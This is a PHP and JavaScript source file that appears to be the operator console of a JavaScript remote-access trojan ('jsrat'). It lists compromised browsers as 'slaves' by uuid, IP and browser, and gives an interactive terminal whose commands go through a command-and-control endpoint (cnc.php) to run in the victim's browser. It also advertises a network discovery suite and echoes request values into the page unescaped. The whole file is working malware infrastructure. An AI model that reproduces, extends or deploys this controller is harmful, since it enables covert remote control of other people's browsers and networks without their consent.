<?php
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
header("Cache-Control: no-store, no-cache, must-revalidate"); // HTTP/1.1
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache"); // HTTP/1.0
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT"); // Date in the past
session_start();
if(empty($_SESSION['auth'])) {
	header('Location: login.php');
	die();
}

include '../sys/head.php';
$last = '*';
$ip = '0.0.0.0';
if(!empty($_GET['clear'])) {
  header("location: console.php?uuid={$_GET['clear']}");
  $db->table('console')->find('uuid', $_GET['clear'])->change('log', '*');
  die();
}
if(empty($uuid = $_GET['uuid'])) {
  die();
}
if($temp = $db->table('console')->find('uuid', $uuid)->get()) {
  $last = $temp[array_key_first($temp)]['log'];
}
if($temp = $db->table('slaves')->find('uuid', $uuid)->get()) {
  $ip = $temp[array_key_first($temp)]['ip'];
  $browser = (new jsrat)->getBrowser($temp[array_key_first($temp)]['ua']);
}
?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Javascript Console</title>
<style>
* {
  box-sizing: border-box;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
}

html, body {
  margin: 0;
  height: 100%;
}

.faux-input {
  position: absolute;
  left: -9999px;
  top: -9999px;
  width: 0px;
  height: 0;
  overflow: hidden;
  padding: 0;
  opacity: 0;
}

.term {
  background: #000;
  width: 100%;
  height: 100%;
  color: #aaa;
  font-family: Monaco, monospace;
  font-weight: 400;
  font-smooth: never;
  -webkit-font-smoothing : none;
  font-size: 12.5pt;
  padding: 3px;
  word-wrap: break-word;
  white-space: pre-wrap;
  display: block;
  line-height: 1.2em;
  overflow-y: scroll;
  position: relative;
  color: #888;
}

.term-focus {
  text-shadow: none;
  color: #ccc;
}

.term .red {
  color: red;
}
.term .blue {
  color: blue;
}
.term .white {
  color: #fff;
}
.term .bold {
  font-weight: bold;
}

.bell {
  width: 0.1em;
  height: 1.1em;
  line-height: 1.2em;
  background: #fff;
  position: absolute;
  animation: flash 1s infinite;
}

@keyframes flash {
  0% {
    visibility: visible;
  }
  49% {
    visibility: visible;
  }
  50% {
    visibility: hidden;
  }
  99% {
    visibility: hidden;
  }
  100% {
    visibility: visible;
  }
}

/* Let's get this party started */
::-webkit-scrollbar {
    width: 12px;
}

::-webkit-scrollbar {
  width: 10px;
}

::-webkit-scrollbar-track {
  border-radius: 10px;
}

::-webkit-scrollbar-thumb {
  border-radius: 10px;
  background: #111;
}
.js-comment   { color: grey; }
.js-no-output { color: white; }
.js-string    { color: #809bbd; }
.js-braces    { color: #b3b3b3; }
.js-error     { color: red;}
.js-notice    { color: yellow; }
.tty-term     { color: green; }
.tty-path     { color: #ddca7e; }
</style>
</head>
<body>
<div class="term" id="term"></div>
</body>
<footer>
<script src="../vendor/jquery/jquery.min.js"></script>
<script>
function fauxTerm(config) {
  var term = config.el || document.getElementById('term');
  var termBuffer = config.initialMessage || '';
  var lineBuffer = config.initialLine || '';
  var cwd = config.cwd || "~/";
  var tags = config.tags || ['red', 'blue', 'white', 'bold'];
  var processCommand = config.cmd || false;
  var maxBufferLength = config.maxBufferLength || 8192;
  var commandHistory = [];
  var currentCommandIndex = -1;
  var maxCommandHistory = config.maxCommandHistory || 100;
  var autoFocus = config.autoFocus || false;
  var coreCmds = {
    "clear": clear,
    "uuid": uuid,
    "help": help
  };
  var waitingOnReply = false;
  var uuid = "<?=$uuid;?>";
  var fauxInput = document.createElement('textarea');
  fauxInput.className = "faux-input";
  document.body.appendChild(fauxInput);
  if ( autoFocus ) {
    fauxInput.focus();
  }
  function getLeader() {
    return cwd + "$ ";
  }
  function renderTerm() {
    var bell = '<span class="bell" onload="this.focus()"></span>';
    var ob = termBuffer + getLeader() + lineBuffer;
    term.innerHTML = ob;
    term.innerHTML += bell;
    term.scrollTop = term.scrollHeight;
  }
  function writeToBuffer(str) {
    termBuffer += str;

    //Stop the buffer getting massive.
    if ( termBuffer.length > maxBufferLength ) {
      var diff = termBuffer.length - maxBufferLength;
      termBuffer = termBuffer.substr(diff);
    }

  }
  function clear(argv, argc) {
    termBuffer = "<h3>[JavaScript Console: <small>'help' for built in functions</small> ]</h3>";
    return "";
  }
  function help() {
      writeToBuffer("<b>Network discovery suite</b>\n$ net {options}\n\n<b>Display uuid of slave</b>\n$ uuid\n\n<b>List out framework functions</b>\n$ help\n");
      return "";
  }
  function uuid() {
      writeToBuffer("<?=$uuid?>\n");
      return "";
  }
  function isCoreCommand(line) {
    if ( coreCmds.hasOwnProperty(line) ) {
      return true;
    }
    return false;
  }
  function coreCommand(argv, argc) {
    var cmd = argv;
    return coreCmds[cmd](argv, argc);
  }
  function processLine() {
    //Dispatch command
    var stdout, line = lineBuffer, argv = line, argc = argv.length;
    var cmd = argv;
    if(cmd != "") {
        lineBuffer += "\n";
        writeToBuffer( getLeader() + lineBuffer );
        lineBuffer = "";
        if( waitingOnReply == true) {
            writeToBuffer("<x id='waitForRecv'><span class='js-notice'><b>INFO:</b></span> Please wait for your last command to finish.<br /></x>")
        } else if ( isCoreCommand(cmd) ) {
            stdout = coreCommand(argv,argc);
        } else {
			sendConsole(cmd);
			writeToBuffer("<x id='waitForRecv'><span class='js-notice'><b>INFO:</b></span> Waiting for response...<br /></x>")
		}
		lineBuffer = "";
        addLineToHistory(cmd);
    }
  }

  function addLineToHistory(line) {
    commandHistory.unshift( line );
    currentCommandIndex = -1;
    if ( commandHistory.length > maxCommandHistory ) {
      console.log('reducing command history size');
      console.log(commandHistory.length);
      var diff = commandHistory.length - maxCommandHistory;
      commandHistory.splice(commandHistory.length -1, diff);
      console.log(commandHistory.length);
    }
  }
  function isInputKey(keyCode) {
    var inputKeyMap = [32,190,192,189,187,220,221,219,222,186,188,191];
    if ( inputKeyMap.indexOf(keyCode) > -1 ) {
      return true;
    }
    return false;
  }
  function toggleCommandHistory(direction) {
    var max = commandHistory.length -1;
    var newIndex = currentCommandIndex + direction;
    if ( newIndex < -1 ) newIndex = -1;
    if ( newIndex >= commandHistory.length) newIndex = commandHistory.length -1;
    if ( newIndex !== currentCommandIndex ) {
      currentCommandIndex = newIndex;
    }
    if ( newIndex > -1 ) {
      //Change line to something from history.
      lineBuffer = commandHistory[newIndex];
    } else {
      //Blank line...
      lineBuffer = "";
    }
  }
  function acceptInput(e) {
    e.preventDefault();
     fauxInput.value = "";
    if ( e.keyCode >= 48 && e.keyCode <= 90 || isInputKey(e.keyCode) ) {
      if (! e.ctrlKey ) {
        //Character input
        lineBuffer += e.key;
      } else {
        //Hot key input? I.e Ctrl+C
      }
    } else if ( e.keyCode === 13 ) {
      if(waitingOnReply != true){
          processLine();
      }
    } else if ( e.keyCode === 9 ) {
      lineBuffer += "\t";
    } else if ( e.keyCode === 38 ) {
      toggleCommandHistory(1);
    } else if ( e.keyCode === 40 ) {
      toggleCommandHistory(-1);
    }
    else if ( e.key === "Backspace" ) {
      lineBuffer = lineBuffer.substr(0, lineBuffer.length -1);
    }
    renderTerm();
  }
  term.addEventListener('click', function(e){
    fauxInput.focus();
    term.classList.add('term-focus');
  });
  fauxInput.addEventListener('keydown', acceptInput);
  fauxInput.addEventListener('blur', function(e){
    term.classList.remove('term-focus');
  });
  function put(x) {
     waitingOnReply = false;
     termBuffer = termBuffer.split("<x id='waitForRecv'><span class='js-notice'><b>INFO:</b></span> Waiting for response...<br /></x>").join('');
    try {
      x = JSON.parse(x)
      x = JSON.stringify(x, undefined, 4)
      writeToBuffer(syntaxHighLight(x)+"<br />");
      renderTerm();
    } catch(e) {
      writeToBuffer(syntaxHighLight(x)+"<br />");
      renderTerm();
    }
  }
  function sendConsole(cmd) {
      console.log('SENT> ' + cmd);
      $.ajax({
          type: 'POST',
          url: "../ajax/cnc.php",
          data: { cmd: 'console', arg: cmd, uuid: '<?=$uuid?>' },
          success: function(x) {
            if(x == 'cooldown') {
              writeToBuffer("<span class='js-error'>ERROR: A previous non-console command is still in action...</span><br />");
              termBuffer = termBuffer.split("<x id='waitForRecv'><span class='js-notice'><b>INFO:</b></span> Waiting for response...<br /></x>").join('');
              renderTerm();
            } else {
                waiting();
            }
          }
      })
  };
  function waiting(){
      waitingOnReply = true;
  }
  function recvConsole() {
    $.ajax({
        type: 'POST',
        url: "../ajax/cnc.php?cb=" + Math.round(new Date().getTime() / 1000),
        data: {cmd: 'getconsole', uuid: '<?=$uuid?>'},
        success: function(x) {
          if(x != '[x]') {
              waitingOnReply = false;
            if (typeof x == 'object') {
              x = (JSON && JSON.stringify ? JSON.stringify(x, undefined, 4) : String(x));
            }
            put(x);
            termBuffer = termBuffer.split("<x id='waitForRecv'><span class='js-notice'><b>INFO:</b></span> Waiting for response...<br /></x>").join('');
            renderTerm();
          }
          return x;
        }
    });
  }
  /*$.ajax({
      type: 'POST',
      url: "../ajax/cnc.php",
      data: {cmd: 'getconsole', uuid: '<?=$uuid?>'},
      success: function(x) {
        console.log(x);
      }
  });*/
  setInterval(recvConsole, 5000)
  renderTerm();
}
var myTerm = new fauxTerm({
  el: document.getElementById("term"),
  cwd: "<span class='tty-term'>guest</span><span class='js-comment'>@</span>"+
  "<span class='tty-term'><?=$ip;?></span><span class='js-comment'>:</span><span class='tty-path'>/<?=str_replace(' ','_',$browser['name']);?>/</span>",
  initialMessage: "<h3>[JavaScript CONSOLE: <small>'help' for built in functions</small> ]</h3>",
  tags: ['red', 'blue', 'white', 'bold'],
  maxBufferLength: 8192,
  maxCommandHistory: 500,
  autoFocus: true
});
function htmlEntities(str) {
    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}
function syntaxHighLight(codex) {
  if(typeof codex === 'undefined') {
    return "<span class='js-no-output'>undefined</span>";
  } else if(typeof codex !== 'string') {
    return "<span class='js-error'>"+codex+"</span>";
  } else if(codex.startsWith("FatalError")) {
		return "<span class='js-error'>"+codex+"</span>";
	}
   var data = codex;
   data = data.replace(/"(.*?)"/g, '<span class="js-string">$1</span>');
   data = data.split('{').join('<span class="js-braces"><b>{</b></span>');
   data = data.split('}').join('<span class="js-braces"><b>}</b></span>');
   data = data.split('[').join('<span class="js-braces"<b>[</b></span>');
   data = data.split(']').join('<span class="js-braces"><b>]</b></span>');
   data = data.split('INFO:').join('<span class="js-notice"><b>INFO:</b></span>');
   data = data.split('USAGE:').join('<span class="js-notice"><b>USAGE:</b></span>');
   data = data.split('ReferenceError:').join('<span class="js-error"><b>ReferenceError:</b></span>');
   data = data.replace(/&lt;(.*?)&gt;/g, "<span class='code-ele'>&lt;$1&gt;</span>");
   return data;
}


const sleep = (milliseconds) => {
  return new Promise(resolve => setTimeout(resolve, milliseconds))
}


</script>
</footer>
</html>
